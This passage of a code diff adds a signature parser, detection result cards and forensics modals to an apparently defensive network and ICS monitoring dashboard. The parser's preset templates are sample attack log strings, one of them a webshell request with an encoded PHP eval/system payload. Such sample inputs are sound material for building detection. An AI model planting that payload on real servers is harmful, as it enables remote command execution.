+                      setParserInputText('S7Comm Function 0x29 Stop PLC CPU order=0x0001 controller=Turbine-02 rack=0 slot=2 dst=192.168.100.99:102');
+                      setParserProtocol('S7Comm');
+                      setParserSrcIp('10.88.88.106');
+                      setParserDstIp('192.168.100.99');
+                      setParserSrcPort('52410');
+                      setParserDstPort('102');
+                    } else if (val === 'syn') {
+                      setParserInputText('TCP SYN Flood alert: 320,000 pps without ACK completion to 211.23.131.21:443 flags=SYN drop_queue_overflow=true');
+                      setParserProtocol('TCP');
+                      setParserSrcIp('203.0.113.199');
+                      setParserDstIp('211.23.131.21');
+                      setParserSrcPort('52100');
+                      setParserDstPort('443');
+                    } else if (val === 'exfil') {
+                      setParserInputText('NetFlow Exfiltration: 14.1 GB transferred over HTTPS to mega.nz cloud storage (198.51.100.88:443) by user RD-ENGINEER');
+                      setParserProtocol('HTTPS');
+                      setParserSrcIp('10.88.88.103');
+                      setParserDstIp('198.51.100.88');
+                      setParserSrcPort('59001');
+                      setParserDstPort('443');
+                    } else if (val === 'dnp3') {
+                      setParserInputText('DNP3 Cold Restart Command: Function 0x0D target_rtu=Substation-Outstation-04 port=20000 status=CRITICAL');
+                      setParserProtocol('DNP3');
+                      setParserSrcIp('10.88.88.106');
+                      setParserDstIp('192.168.100.99');
+                      setParserSrcPort('51920');
+                      setParserDstPort('20000');
+                    } else if (val === 'rdp') {
+                      setParserInputText('RDP Brute Force Alert: 88 failed CredSSP / NLA authentications within 10 seconds for Administrator on port 3389');
+                      setParserProtocol('TCP');
+                      setParserSrcIp('198.51.100.44');
+                      setParserDstIp('10.88.88.20');
+                      setParserSrcPort('49210');
+                      setParserDstPort('3389');
+                    } else if (val === 'webshell') {
+                      setParserInputText('POST /uploads/assets.jsp HTTP/1.1 Godzilla AES pass=secret eval(base64_decode("c3lzdGVtKCRfUE9TVFsndycndSk7")); whoami');
+                      setParserProtocol('HTTP');
+                      setParserSrcIp('185.220.101.45');
+                      setParserDstIp('10.88.88.201');
+                      setParserSrcPort('54120');
+                      setParserDstPort('80');
+                    }
+                  }}
+                  className="bg-black/50 border border-gray-800 rounded-xl px-3 py-1.5 text-xs text-white focus:outline-none focus:border-purple-500 font-bold"
+                >
+                  <option value="">{isZh ? '-- 選擇預設攻擊想定 --' : '-- Select Template --'}</option>
+                  <option value="modbus">工控 Modbus 暫存器竄改 (SIG-ICS-MODBUS-001)</option>
+                  <option value="log4j">Log4Shell JNDI 注入 (SIG-APTS-LOG4J-008)</option>
+                  <option value="c2">Cobalt Strike DNS C2 (SIG-C2-BEACON-002)</option>
+                  <option value="s7comm">西門子 S7Comm 產線停機 (SIG-ICS-S7COMM-010)</option>
+                  <option value="syn">分散式 SYN Flood DDoS (SIG-NET-SYN-009)</option>
+                  <option value="exfil">UEBA 巨量雲端外洩 (SIG-UEBA-EXFIL-007)</option>
+                  <option value="dnp3">工控 DNP3 變電所冷重啟 (SIG-ICS-DNP3-015)</option>
+                  <option value="rdp">RDP 遠端桌面暴力破解 (SIG-BRUTE-RDP-012)</option>
+                  <option value="webshell">哥斯拉 WebShell 通道 (SIG-WEBSHELL-013)</option>
+                </select>
+              </div>
+            </div>
+
+            {/* Inputs grid */}
+            <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '通訊協定' : 'Protocol'}</label>
+                <select
+                  value={parserProtocol}
+                  onChange={(e) => setParserProtocol(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                >
+                  <option value="Modbus">Modbus</option>
+                  <option value="S7Comm">S7Comm</option>
+                  <option value="TCP">TCP</option>
+                  <option value="UDP">UDP</option>
+                  <option value="HTTP">HTTP</option>
+                  <option value="HTTPS">HTTPS</option>
+                  <option value="DNS">DNS</option>
+                  <option value="SSH">SSH</option>
+                </select>
+              </div>
+
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '來源 IP' : 'Src IP'}</label>
+                <input
+                  type="text"
+                  value={parserSrcIp}
+                  onChange={(e) => setParserSrcIp(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                />
+              </div>
+
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '來源埠' : 'Src Port'}</label>
+                <input
+                  type="text"
+                  value={parserSrcPort}
+                  onChange={(e) => setParserSrcPort(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                />
+              </div>
+
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '目的 IP' : 'Dst IP'}</label>
+                <input
+                  type="text"
+                  value={parserDstIp}
+                  onChange={(e) => setParserDstIp(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                />
+              </div>
+
+              <div>
+                <label className="text-[10px] font-bold text-gray-400 block mb-1">{isZh ? '目的埠' : 'Dst Port'}</label>
+                <input
+                  type="text"
+                  value={parserDstPort}
+                  onChange={(e) => setParserDstPort(e.target.value)}
+                  className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                />
+              </div>
+            </div>
+
+            {/* Payload textarea */}
+            <div className="space-y-1.5">
+              <label className="text-[10px] font-bold text-gray-400 flex items-center justify-between">
+                <span>{isZh ? '原始流量封包載荷 (Raw Flow / Packet Payload / Log String)' : 'Raw Flow / Payload / Log String'}</span>
+                <span className="text-[10px] text-purple-400 font-mono font-bold">Regex / DPI / TTP Evaluator</span>
+              </label>
+              <textarea
+                rows={3}
+                value={parserInputText}
+                onChange={(e) => setParserInputText(e.target.value)}
+                placeholder={isZh ? '請在此輸入或貼上任意網路 Flow 描述、HTTP 請求載荷或 Syslog 文本...' : 'Paste raw flow or log message here...'}
+                className="w-full bg-black/60 border border-gray-800 rounded-2xl p-3.5 text-xs text-white placeholder-gray-600 focus:outline-none focus:border-purple-500 font-mono leading-relaxed"
+              />
+            </div>
+
+            {/* Parse submit button */}
+            <div className="flex justify-end">
+              <button
+                onClick={handleParseSignature}
+                disabled={isParsing}
+                className="px-6 py-2.5 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white rounded-2xl text-xs font-black uppercase tracking-wider transition-all flex items-center gap-2 shadow-lg shadow-purple-600/25"
+              >
+                {isParsing ? <RefreshCw className="w-4 h-4 animate-spin text-purple-300" /> : <Sparkles className="w-4 h-4" />}
+                <span>{isParsing ? (isZh ? '特徵碼神經網路比對中...' : 'Evaluating...') : (isZh ? '即時分析特徵碼與關聯規則' : 'Parse & Detect Signature')}</span>
+              </button>
+            </div>
+
+            {/* Instant Detection Output Card */}
+            {parseResult && (
+              <motion.div
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                className={cn(
+                  "p-5 rounded-3xl border space-y-4 shadow-xl",
+                  parseResult.matched
+                    ? "bg-gradient-to-br from-red-950/30 via-[#111114] to-[#161118] border-red-500/40"
+                    : "bg-[#0d0d10] border-emerald-500/30"
+                )}
+              >
+                <div className="flex flex-wrap items-center justify-between gap-3 border-b border-gray-800 pb-3">
+                  <div className="flex items-center gap-2.5">
+                    <div className={cn(
+                      "p-2 rounded-xl border",
+                      parseResult.matched ? "bg-red-500/10 border-red-500/30 text-red-400" : "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
+                    )}>
+                      {parseResult.matched ? <ShieldAlert size={18} /> : <CheckCircle2 size={18} />}
+                    </div>
+                    <div>
+                      <h4 className="text-sm font-black text-white flex items-center gap-2">
+                        {parseResult.matched 
+                          ? (parseResult.detectionResult?.signatureName || '已精準命中惡意威脅特徵碼！')
+                          : '深度規則檢測通過：未發現異常威脅特徵'}
+                        <span className={cn(
+                          "px-2 py-0.5 text-[9px] font-mono font-bold rounded-full uppercase",
+                          parseResult.matched ? "bg-red-500/20 text-red-400 border border-red-500/30" : "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30"
+                        )}>
+                          {parseResult.matched ? 'MATCHED' : 'CLEAN'}
+                        </span>
+                      </h4>
+                      <p className="text-[11px] text-gray-400 font-mono mt-0.5">
+                        {parseResult.detectionResult?.signatureId || 'SIG-EVAL-CLEAN'} • {parseResult.detectionResult?.mitreTTP || 'Baseline Normal'}
+                      </p>
+                    </div>
+                  </div>
+
+                  {parseResult.detectionResult?.riskScore && (
+                    <div className="flex items-center gap-4 bg-black/40 px-3.5 py-1.5 rounded-2xl border border-gray-800">
+                      <div>
+                        <span className="text-[9px] text-gray-500 font-bold block">風險評分 (Risk)</span>
+                        <span className="text-sm font-black font-mono text-red-400">{parseResult.detectionResult.riskScore} / 10.0</span>
+                      </div>
+                      <div className="border-l border-gray-800 pl-3">
+                        <span className="text-[9px] text-gray-500 font-bold block">匹配信心度 (Confidence)</span>
+                        <span className="text-sm font-black font-mono text-purple-400">{parseResult.detectionResult.confidence}%</span>
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {/* Details */}
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+                  <div className="space-y-2">
+                    <h5 className="text-[10px] font-black text-gray-400 uppercase tracking-wider">{isZh ? '規則解析摘要' : 'Analysis Summary'}</h5>
+                    <p className="text-gray-300 leading-relaxed bg-black/30 p-3 rounded-2xl border border-gray-800/80">
+                      {parseResult.detectionResult?.summary || (isZh ? '經特徵碼正規表達式與語意探針雙重比對，該封包為標準業務流量。' : 'Payload matched normal business baseline.')}
+                    </p>
+                    {parseResult.detectionResult?.cve && (
+                      <div className="flex items-center gap-2">
+                        <span className="text-gray-500 text-[11px] font-bold">關聯漏洞/弱點：</span>
+                        <span className="px-2 py-0.5 bg-red-500/10 border border-red-500/30 text-red-400 font-mono font-bold rounded text-[10px]">
+                          {parseResult.detectionResult.cve}
+                        </span>
+                      </div>
+                    )}
+                  </div>
+
+                  <div className="space-y-2">
+                    <h5 className="text-[10px] font-black text-gray-400 uppercase tracking-wider">{isZh ? '建議立即處置應變動作 (SOC Playbook)' : 'Recommended Actions'}</h5>
+                    <div className="space-y-1.5">
+                      {(parseResult.detectionResult?.recommendedActions || [
+                        { title: '持續納入 NetFlow 流量觀測佇列', description: '流量行為正常，保留 Audit 日誌 90 天備查', type: 'monitor' }
+                      ]).map((act: any, idx: number) => (
+                        <div key={idx} className="p-2.5 bg-black/40 border border-gray-800/80 rounded-xl flex items-start gap-2">
+                          <CheckCircle2 size={14} className="text-blue-400 shrink-0 mt-0.5" />
+                          <div>
+                            <p className="font-bold text-white text-[11px]">{act.title}</p>
+                            <p className="text-[10px] text-gray-400">{act.description}</p>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                </div>
+              </motion.div>
+            )}
+          </div>
+
+          {/* Bottom: Attack Signatures Catalog */}
+          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-6 shadow-2xl space-y-4">
+            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-gray-800 pb-4">
+              <div>
+                <h3 className="text-base font-black text-white flex items-center gap-2">
+                  <Database size={18} className="text-blue-400" />
+                  <span>{isZh ? '企業全網攻擊特徵碼與威脅規則庫' : 'Attack Signatures Knowledge Base'}</span>
+                  <span className="px-2 py-0.5 text-[9px] font-mono font-bold bg-blue-500/10 border border-blue-500/30 text-blue-400 rounded-full">
+                    {filteredSignatures.length} 條核心規則
+                  </span>
+                </h3>
+                <p className="text-xs text-gray-400 mt-0.5">
+                  {isZh ? '涵蓋工控 SCADA、勒索軟體、APT 橫向移動、C2 隱蔽通道與應用層零時差弱點。' : 'Covering ICS/SCADA, Ransomware, APT C2, and Web zero-day signatures.'}
+                </p>
+              </div>
+
+              <div className="flex items-center gap-2">
+                <div className="relative">
+                  <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
+                  <input
+                    type="text"
+                    placeholder={isZh ? '搜尋特徵碼名稱 / ID / TTP...' : 'Search signature name, ID...'}
+                    value={signatureSearchQuery}
+                    onChange={(e) => setSignatureSearchQuery(e.target.value)}
+                    className="pl-8 pr-4 py-1.5 bg-black/40 border border-gray-800 rounded-xl text-xs text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 w-56"
+                  />
+                </div>
+              </div>
+            </div>
+
+            {/* Signatures Grid */}
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+              {filteredSignatures.map(sig => (
+                <div key={sig.id} className="p-4 bg-[#0d0d10] border border-gray-800/80 rounded-2xl space-y-2.5 hover:border-purple-500/40 transition-colors flex flex-col justify-between group">
+                  <div className="space-y-2">
+                    <div className="flex items-center justify-between">
+                      <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-purple-500/10 border border-purple-500/25 text-purple-400">
+                        {sig.id}
+                      </span>
+                      <span className="text-[10px] font-mono font-bold text-red-400">
+                        Score {sig.riskScore}
+                      </span>
+                    </div>
+                    <h4 className="text-xs font-black text-white group-hover:text-purple-300 transition-colors">
+                      {sig.name}
+                    </h4>
+                    <p className="text-[11px] text-gray-400 leading-relaxed line-clamp-2">
+                      {sig.description}
+                    </p>
+                  </div>
+
+                  <div className="pt-2 border-t border-gray-800/60 flex items-center justify-between text-[10px]">
+                    <span className="text-gray-500 font-mono">{sig.mitreTTP}</span>
+                    <button
+                      onClick={() => {
+                        setParserInputText(sig.samplePayload || `Flow payload testing for ${sig.name}`);
+                        if (sig.defaultProtocol) setParserProtocol(sig.defaultProtocol);
+                        if (sig.defaultPort) setParserDstPort(String(sig.defaultPort));
+                        window.scrollTo({ top: 300, behavior: 'smooth' });
+                      }}
+                      className="px-2 py-1 bg-purple-600/15 hover:bg-purple-600 text-purple-400 hover:text-white rounded-lg font-bold transition-colors"
+                    >
+                      {isZh ? '載入工作台' : 'Load to Parser'}
+                    </button>
+                  </div>
+                </div>
+              ))}
+            </div>
           </div>
         </div>
       ) : (
@@ -1790,20 +3239,521 @@ export default function NetworkMonitorView() {
               </div>
 
               {/* Audit Modal Footer */}
-              <div className="p-4 border-t border-gray-800 bg-[#0d0d10] flex justify-between items-center">
-                <button
-                  onClick={() => handleRequestAudit(auditTarget)}
-                  disabled={loadingAudit}
-                  className="px-4 py-2 bg-purple-600/15 hover:bg-purple-600 border border-purple-500/30 text-purple-400 hover:text-white rounded-xl text-xs font-bold transition-all flex items-center gap-2"
-                >
-                  <RefreshCw size={14} className={cn(loadingAudit && "animate-spin")} />
-                  <span>{isZh ? '重新發起即時安全審計' : 'Trigger Fresh Audit'}</span>
-                </button>
+              <div className="p-4 border-t border-gray-800 bg-[#0d0d10] flex justify-end">
                 <button
                   onClick={() => setAuditModalOpen(false)}
                   className="px-5 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-xl text-xs font-bold transition-colors"
                 >
                   {isZh ? '關閉審計視窗' : 'Close Audit'}
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+
+        {/* Flow Forensics & Packet Details Modal */}
+        {selectedFlow && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
+            <motion.div
+              initial={{ scale: 0.95, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.95, opacity: 0 }}
+              className="w-full max-w-2xl bg-[#111114] border border-gray-800 rounded-3xl overflow-hidden shadow-2xl space-y-0"
+            >
+              <div className="p-6 border-b border-gray-800 flex items-center justify-between bg-[#0d0d10]">
+                <div className="flex items-center gap-3">
+                  <div className={cn(
+                    "p-2.5 rounded-2xl border",
+                    selectedFlow.threatLevel === 'malicious' ? "bg-red-500/10 border-red-500/30 text-red-400" :
+                    selectedFlow.threatLevel === 'suspicious' ? "bg-amber-500/10 border-amber-500/30 text-amber-400" :
+                    "bg-blue-500/10 border-blue-500/30 text-blue-400"
+                  )}>
+                    <Waves size={22} />
+                  </div>
+                  <div>
+                    <h3 className="text-base font-black text-white flex items-center gap-2">
+                      {isZh ? 'NetFlow 封包取證與特徵碼分析' : 'NetFlow Forensics & Signature Match'}
+                      <span className={cn(
+                        "px-2 py-0.5 text-[9px] font-mono font-bold uppercase rounded-full",
+                        selectedFlow.threatLevel === 'malicious' ? "bg-red-500/20 text-red-400 border border-red-500/40" :
+                        selectedFlow.threatLevel === 'suspicious' ? "bg-amber-500/20 text-amber-400 border border-amber-500/40" :
+                        "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
+                      )}>
+                        {selectedFlow.threatLevel}
+                      </span>
+                    </h3>
+                    <p className="text-xs text-gray-400 font-mono mt-0.5">{selectedFlow.id} • {selectedFlow.timestamp}</p>
+                  </div>
+                </div>
+                <button
+                  onClick={() => setSelectedFlow(null)}
+                  className="p-2 hover:bg-gray-800 rounded-xl text-gray-400 hover:text-white transition-colors"
+                >
+                  <X size={18} />
+                </button>
+              </div>
+
+              <div className="p-6 space-y-5">
+                {/* Endpoints banner */}
+                <div className="p-4 bg-black/50 border border-gray-800 rounded-2xl flex items-center justify-between font-mono text-xs">
+                  <div>
+                    <span className="text-[10px] text-gray-500 block">{isZh ? '來源通訊主機' : 'Source'}</span>
+                    <strong className="text-white text-sm">{selectedFlow.srcIp}:{selectedFlow.srcPort}</strong>
+                    <p className="text-[11px] text-blue-400">{selectedFlow.srcDeviceName || 'Exporter'}</p>
+                  </div>
+                  <ArrowRight size={20} className="text-gray-500" />
+                  <div className="text-right">
+                    <span className="text-[10px] text-gray-500 block">{isZh ? '目的目標主機' : 'Destination'}</span>
+                    <strong className="text-white text-sm">{selectedFlow.dstIp}:{selectedFlow.dstPort}</strong>
+                    <p className="text-[11px] text-indigo-400">{selectedFlow.dstDeviceName || 'Target'}</p>
+                  </div>
+                </div>
+
+                {/* Signature Box if present */}
+                {selectedFlow.signatureMatch && (
+                  <div className="p-4 bg-red-950/25 border border-red-500/35 rounded-2xl space-y-2">
+                    <div className="flex items-center justify-between">
+                      <span className="px-2 py-0.5 text-[10px] font-mono font-bold bg-purple-500/20 border border-purple-500/40 text-purple-300 rounded">
+                        {selectedFlow.signatureMatch.signatureId}
+                      </span>
+                      <span className="text-xs font-mono font-bold text-red-400">
+                        Risk {selectedFlow.signatureMatch.riskScore} • Confidence {selectedFlow.signatureMatch.confidence}%
+                      </span>
+                    </div>
+                    <h4 className="text-sm font-bold text-white">{selectedFlow.signatureMatch.signatureName}</h4>
+                    <p className="text-xs text-gray-300 leading-relaxed">{selectedFlow.signatureMatch.description}</p>
+                    <div className="pt-2 border-t border-red-500/20 flex flex-wrap gap-2 text-[10px] font-mono text-red-300">
+                      <span>MITRE: {selectedFlow.signatureMatch.mitreTTP}</span>
+                      <span>• Tactic: {selectedFlow.signatureMatch.mitreTactic}</span>
+                      {selectedFlow.signatureMatch.cve && <span>• CVE: {selectedFlow.signatureMatch.cve}</span>}
+                    </div>
+                  </div>
+                )}
+
+                {/* Packet & Rate Telemetry */}
+                <div className="grid grid-cols-3 gap-3 text-xs bg-[#09090b] p-4 rounded-2xl border border-gray-800">
+                  <div>
+                    <span className="text-gray-500 text-[10px] font-bold block">{isZh ? '頻寬吞吐' : 'Bandwidth'}</span>
+                    <strong className="text-white font-mono text-sm">{(selectedFlow.bps / 1000000).toFixed(2)} Mbps</strong>
+                  </div>
+                  <div>
+                    <span className="text-gray-500 text-[10px] font-bold block">{isZh ? '封包速率' : 'PPS'}</span>
+                    <strong className="text-emerald-400 font-mono text-sm">{selectedFlow.pps.toLocaleString()} pps</strong>
+                  </div>
+                  <div>
+                    <span className="text-gray-500 text-[10px] font-bold block">{isZh ? '傳輸總量' : 'Volume'}</span>
+                    <strong className="text-blue-400 font-mono text-sm">{((selectedFlow.bytes || 0) / (1024 * 1024)).toFixed(2)} MB</strong>
+                  </div>
+                  <div className="col-span-3 pt-2 border-t border-gray-800/80 flex justify-between text-[11px] text-gray-400">
+                    <span>採樣介面: <strong className="text-gray-300 font-mono">{selectedFlow.sampledInterface}</strong></span>
+                    <span>TCP Flags: <strong className="text-gray-300 font-mono">{(selectedFlow.flags || []).join(', ') || 'N/A'}</strong></span>
+                    <span>持續時間: <strong className="text-gray-300 font-mono">{(selectedFlow.durationMs / 1000).toFixed(1)}s</strong></span>
+                  </div>
+                </div>
+              </div>
+
+              <div className="p-4 border-t border-gray-800 bg-[#0d0d10] flex justify-between items-center">
+                {selectedFlow.status === 'active' && selectedFlow.threatLevel !== 'normal' ? (
+                  <button
+                    onClick={() => handleBlockFlow(selectedFlow.id)}
+                    className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-xl text-xs font-bold transition-all flex items-center gap-2 shadow-lg shadow-red-600/30"
+                  >
+                    <ShieldX size={14} />
+                    <span>{isZh ? '立即下發交換機 ACL 阻斷' : 'Block Flow with ACL'}</span>
+                  </button>
+                ) : (
+                  <span className="text-xs font-mono text-gray-500">
+                    {selectedFlow.status === 'blocked' ? (isZh ? '此流量已被 ACL 阻斷' : 'Flow is blocked') : (isZh ? '正常基準線通訊' : 'Normal')}
+                  </span>
+                )}
+                <button
+                  onClick={() => setSelectedFlow(null)}
+                  className="px-5 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-xl text-xs font-bold transition-colors"
+                >
+                  {isZh ? '關閉取證視窗' : 'Close'}
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+
+        {/* Link Telemetry Inspector Modal */}
+        {selectedLink && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
+            <motion.div
+              initial={{ scale: 0.95, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.95, opacity: 0 }}
+              className="w-full max-w-lg bg-[#111114] border border-gray-800 rounded-3xl overflow-hidden shadow-2xl space-y-0"
+            >
+              <div className="p-5 border-b border-gray-800 flex items-center justify-between bg-[#0d0d10]">
+                <div className="flex items-center gap-3">
+                  <div className="p-2.5 bg-blue-600/10 border border-blue-500/20 rounded-2xl text-blue-400">
+                    <Activity size={20} />
+                  </div>
+                  <div>
+                    <h3 className="text-base font-black text-white">{isZh ? '實體拓撲鏈路即時 Telemetry' : 'Physical Link Telemetry'}</h3>
+                    <p className="text-xs text-gray-400 font-mono mt-0.5">{selectedLink.from} ➔ {selectedLink.to}</p>
+                  </div>
+                </div>
+                <button
+                  onClick={() => setSelectedLink(null)}
+                  className="p-1.5 hover:bg-gray-800 rounded-xl text-gray-400 hover:text-white transition-colors"
+                >
+                  <X size={16} />
+                </button>
+              </div>
+
+              <div className="p-5 space-y-4 text-xs">
+                <div className="grid grid-cols-2 gap-3 bg-[#09090b] p-4 rounded-2xl border border-gray-800">
+                  <div>
+                    <span className="text-gray-500 text-[10px] font-bold block">{isZh ? '介面容量' : 'Capacity'}</span>
+                    <strong className="text-white font-mono text-sm">{selectedLink.speed}</strong>
+                  </div>
+                  <div>
+                    <span className="text-gray-500 text-[10px] font-bold block">{isZh ? '當前負載率' : 'Utilization'}</span>
+                    <strong className={cn("font-mono text-sm", selectedLink.utilization > 70 ? "text-red-400" : "text-emerald-400")}>
+                      {selectedLink.utilization}%
+                    </strong>
+                  </div>
+                  <div className="col-span-2 pt-2 border-t border-gray-800 flex justify-between text-gray-400">
+                    <span>鏈路材質: <strong className="text-blue-400 font-mono uppercase">{selectedLink.type}</strong></span>
+                    <span>介面協定: <strong className="text-gray-300 font-mono">IEEE 802.3ba</strong></span>
+                  </div>
+                </div>
+
+                {/* Associated flows crossing this link */}
+                <div>
+                  <h4 className="text-[11px] font-black text-gray-400 uppercase tracking-wider mb-2">
+                    {isZh ? '行經此鏈路之 NetFlow 串流' : 'Traversing NetFlow Streams'}
+                  </h4>
+                  <div className="space-y-1.5 max-h-40 overflow-y-auto custom-scrollbar">
+                    {flows.filter(f => 
+                      f.srcDeviceId === selectedLink.from || f.dstDeviceId === selectedLink.to ||
+                      f.srcDeviceId === selectedLink.to || f.dstDeviceId === selectedLink.from
+                    ).slice(0, 5).map(f => (
+                      <div key={f.id} className="p-2.5 bg-black/40 border border-gray-800 rounded-xl flex items-center justify-between font-mono text-[11px]">
+                        <div>
+                          <span className="text-blue-400 font-bold">{f.protocol}</span>
+                          <span className="text-gray-400 ml-2">{f.srcIp}:{f.srcPort} ➔ {f.dstIp}:{f.dstPort}</span>
+                        </div>
+                        <span className={cn(
+                          "px-1.5 py-0.5 rounded text-[9px] font-bold uppercase",
+                          f.threatLevel === 'malicious' ? "bg-red-500/20 text-red-400" : "bg-gray-800 text-gray-400"
+                        )}>
+                          {f.threatLevel}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              </div>
+
+              <div className="p-4 border-t border-gray-800 bg-[#0d0d10] flex justify-end">
+                <button
+                  onClick={() => setSelectedLink(null)}
+                  className="px-5 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-xl text-xs font-bold transition-colors"
+                >
+                  {isZh ? '關閉' : 'Close'}
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+
+        {/* Monitored Interfaces Telemetry Modal */}
+        {interfacesModalOpen && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
+            <motion.div
+              initial={{ scale: 0.95, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.95, opacity: 0 }}
+              className="w-full max-w-4xl bg-[#111114] border border-gray-800 rounded-3xl overflow-hidden shadow-2xl"
+            >
+              <div className="p-5 border-b border-gray-800 flex items-center justify-between bg-[#0d0d10]">
+                <div className="flex items-center gap-3">
+                  <div className="p-2.5 bg-cyan-600/10 border border-cyan-500/20 rounded-2xl text-cyan-400">
+                    <Server size={22} />
+                  </div>
+                  <div>
+                    <h3 className="text-base font-black text-white flex items-center gap-2">
+                      {isZh ? 'NetFlow 採樣實體交換機介面監聽矩陣' : 'Monitored Physical Switch Interfaces'}
+                      <span className="px-2 py-0.5 text-[10px] font-mono font-bold bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 rounded-full">
+                        {collectorInterfaces.length} INTERFACES
+                      </span>
+                    </h3>
+                    <p className="text-xs text-gray-400 font-mono mt-0.5">
+                      {isZh 
+                        ? '支援 Cisco Catalyst, Palo Alto PAN-OS, OT Data Diode 高速 SPAN / TAP 採樣埠' 
+                        : 'Real-time SPAN/TAP telemetry across backbone core switches and OT industrial diodes'}
+                    </p>
+                  </div>
+                </div>
+                <button
+                  onClick={() => setInterfacesModalOpen(false)}
+                  className="p-1.5 hover:bg-gray-800 rounded-xl text-gray-400 hover:text-white transition-colors"
+                >
+                  <X size={18} />
+                </button>
+              </div>
+
+              <div className="p-5 overflow-x-auto">
+                <table className="w-full text-left border-collapse text-xs">
+                  <thead>
+                    <tr className="border-b border-gray-800 bg-black/30 text-gray-400 font-bold">
+                      <th className="px-4 py-3">{isZh ? '介面名稱' : 'Interface'}</th>
+                      <th className="px-4 py-3">{isZh ? '關聯設備節點' : 'Device Node'}</th>
+                      <th className="px-3 py-3">{isZh ? '鏈路速率' : 'Speed'}</th>
+                      <th className="px-3 py-3">{isZh ? '運作狀態' : 'Status'}</th>
+                      <th className="px-4 py-3 font-mono">{isZh ? 'RX 封包 / 流量' : 'RX Packets / Vol'}</th>
+                      <th className="px-4 py-3 font-mono">{isZh ? 'TX 封包 / 流量' : 'TX Packets / Vol'}</th>
+                      <th className="px-3 py-3 font-mono text-center">{isZh ? '丟包/錯誤' : 'Drops'}</th>
+                      <th className="px-3 py-3 font-mono text-right">{isZh ? '活躍流' : 'Flows'}</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-gray-800/60">
+                    {collectorInterfaces.map(iface => (
+                      <tr key={iface.id} className="hover:bg-white/[0.02]">
+                        <td className="px-4 py-3.5 font-bold font-mono text-white flex items-center gap-2">
+                          <span className="w-2 h-2 rounded-full bg-emerald-400 shrink-0" />
+                          {iface.name}
+                        </td>
+                        <td className="px-4 py-3.5 text-gray-300">
+                          {iface.device}
+                        </td>
+                        <td className="px-3 py-3.5 font-mono text-blue-400 font-bold">
+                          {iface.speed}
+                        </td>
+                        <td className="px-3 py-3.5">
+                          <span className={cn(
+                            "px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase",
+                            iface.status === 'up' ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" : "bg-red-500/10 text-red-400"
+                          )}>
+                            {iface.status}
+                          </span>
+                        </td>
+                        <td className="px-4 py-3.5 font-mono">
+                          <p className="text-white font-bold">{iface.rxPackets.toLocaleString()}</p>
+                          <p className="text-[10px] text-gray-400">{(iface.rxBytes / 1000000).toFixed(1)} MB</p>
+                        </td>
+                        <td className="px-4 py-3.5 font-mono">
+                          <p className="text-white font-bold">{iface.txPackets.toLocaleString()}</p>
+                          <p className="text-[10px] text-gray-400">{(iface.txBytes / 1000000).toFixed(1)} MB</p>
+                        </td>
+                        <td className="px-3 py-3.5 font-mono text-center">
+                          <span className={cn(
+                            "px-1.5 py-0.5 rounded text-[10px]",
+                            iface.drops > 0 ? "bg-amber-500/20 text-amber-400" : "text-gray-500"
+                          )}>
+                            {iface.drops}
+                          </span>
+                        </td>
+                        <td className="px-3 py-3.5 font-mono text-right text-cyan-400 font-bold">
+                          {iface.flowCount}
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+
+              <div className="p-4 border-t border-gray-800 bg-[#0d0d10] flex justify-between items-center text-xs">
+                <span className="text-gray-500">
